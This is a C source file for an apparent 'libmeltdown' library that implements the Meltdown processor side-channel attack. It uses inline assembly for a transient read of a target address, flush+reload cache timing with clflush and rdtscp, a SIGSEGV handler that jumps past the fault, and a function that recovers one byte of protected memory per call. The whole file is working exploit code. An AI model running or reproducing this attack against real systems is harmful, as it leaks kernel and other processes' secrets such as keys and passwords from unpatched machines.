/*
  Meltdown lib 
 */
#include "libmeltdown.h"

/*
  Downside of this implementation, can't read 0 values
  shift by 14 left since you want to mulitply the index by 4096 and sizeof(int) 
 
  NOTE: Must be an array of INTEGERS!!! NOT CHARS LIKE IN THE ORIGINAL PAPER
*/
#define MELTDOWN(addr) \
  asm("1:\n movzx (%%rcx), %%rax\n" \
      "shl $14, %%rax\n" \
      "jz 1b\n" \
      "movq (%%rax, %%rbx, 1), %%rbx\n" \ 
      :						\
      : "c"(addr), "b"(rec)			\
      : "rax");


/*
  Global vars 
 */
int* rec;
sigjmp_buf jmp_buffer; 

/*
  Helper functions 
*/
static inline void maccess(void *p) {
  asm volatile("movq (%0), %%rax\n" : : "c"(p) : "rax");
}

static void flush(void *p) {
  asm volatile("clflush 0(%0)\n" : : "c"(p) : "rax");
}

static inline uint64_t rdtscp() {
  uint64_t a = 0, d = 0;
  asm volatile("mfence");
  asm volatile("rdtscp" : "=a"(a), "=d"(d) :: "rcx");
  a = (d << 32) | a;
  asm volatile("mfence");
  return a;

}

static inline int flush_reload(void *p) {
  // time access
  register uint64_t start, elapsed; 
  start = rdtscp();
  maccess(p);
  elapsed = rdtscp() - start;
  flush(p);
  return elapsed < THRESHOLD ? 1 : 0;
}


/*
  Meltdown setup code 
 */
void meltdown_init() {
  // setup recieving array
  rec = (int *) malloc(300 * 4096 * sizeof(*rec)); // page stride
  rec = (int *) (((size_t)rec & ~0xfff) + 0x2000);
  memset(rec, 0x00, 4096 * 270 * sizeof(*rec)); // THIS IS NECESSARY OR ELSE FLUSHES TO ONE ADDRESS FLUSH THE WHOLE STRUCTURE
  for(int i = 0; i < 256; i++) {
    flush(&rec[i * 4096]); //flush it from memory 
  }

  // setup signals
  struct sigaction sa;
  memset(&sa, 0, sizeof(sa));
  sa.sa_sigaction = meltdown_seg_handler; // our sig action handler
  sa.sa_flags = SA_SIGINFO; // get info incase we ever need context
  sigemptyset(&sa.sa_mask); // clear mask
  sigaddset(&sa.sa_mask, SIGSEGV);
  int status = sigaction(SIGSEGV, &sa, 0);

  // check signal results
  if(status == -1) {
    FATAL("Sig action install failed!\n");
    exit(1); 
  }
  
  INFO("Init finished\n");
}

/*
  Seg fault handler
 */
static void meltdown_seg_handler(int sig, siginfo_t *info, void* context) {  
  // jump back to faulting instruction
  longjmp(jmp_buffer, 1); 
}


/*
  Read byte function 
 */
char __attribute__((optimize("-Os"), noinline)) meltdown_read_byte(char* addr) {
  // hit counter
  int hit[256];
  memset(hit, 0, sizeof(hit));
  
  // repeat attack for RETRIES amount of time
  for(int j = 0; j < RETRIES; j++) {
    // meltdown attack into cache
    if(!setjmp(jmp_buffer)) {
      MELTDOWN(addr);
    }
    
    // flush + reload
    for(int k = 0; k < 256; k++) {
      if(flush_reload(rec + k*4096)) hit[k]++;
    }
  }
  
  // find max
  int max = 0;
  int max_idx = -1;
  for(int j = 0; j < 256; j++) {
    if(hit[j] > max) {
      max = hit[j];
      max_idx = j;
    }
  }
  
  // add ret
  char byte_value = (char)max_idx;
  
#if DEBUG
  INFO("byte value read: %d\n", byte_value);
#endif

  return byte_value;
}


/*
  TODO read string function 
*/
